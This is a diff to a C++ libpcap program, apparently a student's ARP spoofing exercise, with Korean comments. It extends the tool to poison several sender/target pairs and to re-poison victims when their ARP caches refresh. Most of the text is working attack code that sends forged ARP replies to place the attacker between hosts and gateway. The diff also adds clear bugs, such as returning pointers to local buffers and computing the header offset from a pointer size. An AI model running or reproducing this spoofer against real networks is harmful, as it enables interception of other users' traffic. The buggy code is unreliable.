@@ -8,7 +8,9 @@
 #include <sys/ioctl.h>
 #include <net/if.h>
 #include <unistd.h>
+#include <map>
 
+using namespace std;
 
 #pragma pack(push, 1)
 struct EthArpPacket {
@@ -18,8 +20,8 @@ struct EthArpPacket {
 #pragma pack(pop)
 
 void usage() {
-	printf("syntax: send-arp-test <interface> <sender ip> <target ip>\n");
-	printf("sample: send-arp-test wlan0 192.168.10.2 192.168.10.1\n");
+	printf("syntax: send-arp-test <interface> <sender ip 1> <target ip 1>[<sender ip 2> <target ip 2> ...\n");
+	printf("sample: send-arp-test wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
 }
 
 int sendArpPacket(pcap_t* handle, std::string aprHdr,Mac ethSmac, Mac ethDmac, 
@@ -54,9 +56,10 @@ int sendArpPacket(pcap_t* handle, std::string aprHdr,Mac ethSmac, Mac ethDmac,
 	return res;
 }
 
-void my_mac_addr(char* dev, char* myMac){
-    struct ifreq ifr;
+char* my_mac_addr(char* dev){
+	struct ifreq ifr;
 	char MAC_str[18];
+	Mac myMac;
 
 	#define HWADDR_len 6
     int s,i;
@@ -64,20 +67,21 @@ void my_mac_addr(char* dev, char* myMac){
     s = socket(AF_INET, SOCK_DGRAM, 0);
     strcpy(ifr.ifr_name, dev);
     ioctl(s, SIOCGIFHWADDR, &ifr);
+	// memcpy(&myMac, ifr.ifr_hwaddr.sa_data,6);
     for (i=0; i<HWADDR_len; i++)
         sprintf(&MAC_str[i*3],"%02X:",((unsigned char*)ifr.ifr_hwaddr.sa_data)[i]);
     MAC_str[17]='\0';
     printf("myOwn MAC Address is %s\n", MAC_str);
     
 	close(s);
-	strcpy(myMac, MAC_str);
-	return;
+	return MAC_str;
 }
 
-void my_ip_addr(char* dev, char* myIp){
+char* my_ip_addr(char* dev){
     struct ifreq ifr;
     char ipstr[40];
-    int s;
+    // Ip myIp;
+	int s;
  
     s = socket(AF_INET, SOCK_DGRAM, 0);
     strncpy(ifr.ifr_name, dev, IFNAMSIZ);
@@ -85,13 +89,13 @@ void my_ip_addr(char* dev, char* myIp){
     if (ioctl(s, SIOCGIFADDR, &ifr) < 0) {
         printf("Error");
     } else {
-        inet_ntop(AF_INET, ifr.ifr_addr.sa_data+2,
-                ipstr,sizeof(struct sockaddr));
-        printf("myOwn IP  Address is %s\n\n", ipstr);
-		strcpy(myIp, ipstr);
+		// memcpy(&myIp, ifr.ifr_addr.sa_data,4);
+        // inet_ntop(AF_INET, ifr.ifr_addr.sa_data+2,
+        //         ipstr,sizeof(struct sockaddr));
+        // printf("myOwn IP  Address is %s\n\n", ipstr);
     }
 	close(s);
-    return;
+    return ipstr;
 }
 
 int main(int argc, char* argv[]) {
@@ -105,11 +109,23 @@ int main(int argc, char* argv[]) {
 
 	char* myMacStr = (char*)malloc(sizeof(char)*18);
 	char* myIpStr  = (char*)malloc(sizeof(char)*16);
-	my_mac_addr(dev, myMacStr);
-	my_ip_addr(dev, myIpStr);
+	Mac myMac{my_mac_addr(dev)};	
+	Ip  myIp{my_ip_addr(dev)};
 
-	Mac myMac = {myMacStr};
-	Ip  myIp  = {myIpStr};
+	// sender를 감염 시킨다고 생각을 할 것
+	// 1. sender에게 주기적, 비주기적으로 보내서 감염
+	// 2. sender로부터 spoofed ip packet을 수신하면 replay IP pakcet 송신
+
+	// ARP Spoofing Flow Map
+	// map for sender, target
+	map<Ip, Ip> ASFMAP;
+	map<Ip, Mac> IP2MAC;
+
+	for (int i = 2 ; i < argc ; i += 2){
+		Ip sender_ip{argv[i]};
+		Ip target_ip{argv[i+1]};
+		ASFMAP[sender_ip] = target_ip;
+	}
 
 	char errbuf[PCAP_ERRBUF_SIZE];
 	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
@@ -118,28 +134,66 @@ int main(int argc, char* argv[]) {
 		return -1;
 	}
 
-	// Victim IP
-	Ip senderIp{argv[2]};
-	
-	// Normally Gateway
-	Ip targetIp{argv[3]};
-
-	// 자신의 Mac 주소 값을 알아냄
 	Mac broadCastMac = Mac("ff:ff:ff:ff:ff:ff");
 	Mac zeroMac = Mac("00:00:00:00:00:00");
 
 	Mac senderMac;
+	Ip senderIp;
+	Ip targetIp;
 
-	// Sender(Victim)의 Mac 주소를 알아옴
-	// ARP request 송신
-	// handle, Mac ethSmac, Mac ethDmac, Mac arpSmac, Ip arpSip, Mac arpTmac, Ip arpTip
-	int res = sendArpPacket(handle, "Request", myMac, broadCastMac, myMac, myIp, zeroMac, senderIp);
-	if (res != 0) {
-		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+	// link mac to ip
+	for(auto it = ASFMAP.begin(); it!=ASFMAP.end(); it++){
+
+		if (IP2MAC.find(it->first) != IP2MAC.end()){
+			continue;
+		}
+
+		// Sender(Victim)의 Mac 주소를 알아옴
+		// ARP request 송신
+		// handle, Mac ethSmac, Mac ethDmac, Mac arpSmac, Ip arpSip, Mac arpTmac, Ip arpTip
+		int res =  sendArpPacket(handle, "Request", myMac, broadCastMac, myMac, myIp, zeroMac, it->first);
+		if (res != 0) {
+			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+		}
+
+		// ARP reply 수신
+		while (true) {
+			pcap_pkthdr* header;
+			const u_char*	packet;
+
+			int res = pcap_next_ex(handle, &header, &packet);
+			if (res == 0) continue;
+			if (res == -1 || res == -2) {
+				printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
+				break;
+			}
+
+			EthHdr* ethernet = (EthHdr*)(packet);
+			
+			if(ethernet->type() != EthHdr::Arp){
+				continue;
+			};
+
+			ArpHdr* arp = (ArpHdr*)((uint8_t*)packet + sizeof(EthHdr*));
+			if(arp->tip() != myIp || arp->op() != ArpHdr::Reply) {
+				continue;
+			}
+
+			senderMac = arp->smac_;
+			senderIp = it->first;
+			targetIp = ASFMAP[senderIp];
+			
+			// handle, Mac ethSmac, Mac ethDmac, Mac arpSmac, Ip arpSip, Mac arpTmac, Ip arpTip
+			res = sendArpPacket(handle, "Reply", myMac, senderMac, myMac, senderIp, senderMac, targetIp);
+
+			break;
+		}
 	}
 
-	// ARP reply 수신
-	// 패킷을 받고
+
+	// 현재 sender는 나를 게이트웨이로 알고 있다
+	// 그렇기 때문에 실제 게이트웨이에서 연락이 온다면 복구될 것
+	// 이를 재 감염
 	while (true) {
 		pcap_pkthdr* header;
 		const u_char*	packet;
@@ -153,25 +207,53 @@ int main(int argc, char* argv[]) {
 
 		EthHdr* ethernet = (EthHdr*)(packet);
 		
-		if(ethernet->type() != EthHdr::Arp){
-		 	continue;
+		// 만약 이 패킷이 target에게 reply하는 패킷이라면
+		if(ethernet->type() == EthHdr::Arp){
+		 	ArpHdr* arp = (ArpHdr*)((uint8_t*)packet + sizeof(EthHdr*));
+			
+			// cache가 만료되어 gateway에게 request를 보낼 때
+			if(arp->tip_ == ASFMAP[arp->sip_] || arp->op() == ArpHdr::Request) {
+				senderMac = IP2MAC[arp->sip_];
+				senderIp = arp->sip_;
+				targetIp = ASFMAP[arp->sip_];
+
+				res = sendArpPacket(handle, "Reply", myMac, senderMac, myMac, senderIp, senderMac, targetIp);
+				if (res != 0) {
+						fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+				}
+
+				continue;
+			}
+			
+			// gateway가 broadcast를 보낼 때
+			if(arp->tmac_ == broadCastMac || arp->op() == ArpHdr::Request){
+
+				for(auto it = ASFMAP.begin(); it!=ASFMAP.end(); it++) {
+					if (arp->sip_ != ASFMAP[it->first]) continue;
+					senderMac = IP2MAC[it->first];
+					senderIp = it->first;
+					targetIp = ASFMAP[it->first];
+
+					res = sendArpPacket(handle, "Reply", myMac, senderMac, myMac, senderIp, senderMac, targetIp);
+					if (res != 0) {
+						fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+					}
+				}
+
+				continue;
+			}
+
 		};
 
-		ArpHdr* arp = (ArpHdr*)((uint8_t*)packet + 14);
-		if(arp->tip() != myIp || arp->op() != ArpHdr::Reply) {
-			continue;
+		// 다른 패킷도 relay 해주어야 함
+		if (ethernet->type() == EthHdr::Ip4){
+
+
 		}
 
-		senderMac = arp->smac();
-		
-		break;
+	}
 
-	}
-	// handle, Mac ethSmac, Mac ethDmac, Mac arpSmac, Ip arpSip, Mac arpTmac, Ip arpTip
-	res = sendArpPacket(handle, "Reply", myMac, senderMac, myMac, targetIp, senderMac, senderIp);
-	if (res != 0) {
-		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
-	}
+	// 마지막 recover 잊지 말기
 
 	printf("finish");
 	pcap_close(handle);
